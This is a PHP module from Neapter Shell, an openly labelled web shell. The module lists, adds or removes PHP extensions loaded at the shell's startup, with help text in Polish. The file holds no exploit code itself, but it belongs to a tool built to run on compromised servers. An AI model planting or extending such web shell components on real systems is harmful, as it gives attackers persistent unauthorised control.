<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Load extensions like imap, curl
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleAutoload extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('autoload');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wczytywanie rozszerzeń PHP

    Rozszerzenia te wczytywane są za każdym razem podczas startu

    Użycie:
        autoload -l - wyświetlanie rozszerzen, które zostały wczytane
        autoload -f - odłączenie wszystkich rozszerzen
        autoload nazwa_rozszerzenia [sciezka_do_rozszerzenia rozszerzenie]

    Przykład:
        autoload imap
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        $iArgs = $this->oArgs->getNumberOfParams();
        $aSwitches = $this->oArgs->getSwitches();

        if (($iArgs === 0) && !$aSwitches) {
            return self::getHelp();
        }

        $aAutoload = array();


        if (($iArgs == 0) && array_key_exists('l', $aSwitches)) {
            $aAutoload = $this->oUtils->autoloadModulesGet();

            if ($aAutoload === array()) {
                return 'Nie wczytano żadnych rozszerzeń';
            }

            return sprintf(
                "Wczytane rozszerzenia:\r\n\r\n%s",
                implode("\r\n", $aAutoload)
            );
        }

        if (($iArgs === 0) && array_key_exists('f', $aSwitches)) {
            return sprintf(
                'Plik z rozszerzeniami %szostał usunięty',
                !$this->oUtils->removeLoadedModules() ? 'nie ' : ''
            );
        }

        $this->oUtils->autoloadModulesAdd($this->oArgs->getParams());

        return sprintf(
            "Wczytane rozszerzenia:\r\n%s",
            implode("\r\n", $this->oUtils->autoloadModulesGet())
        );
    }
}
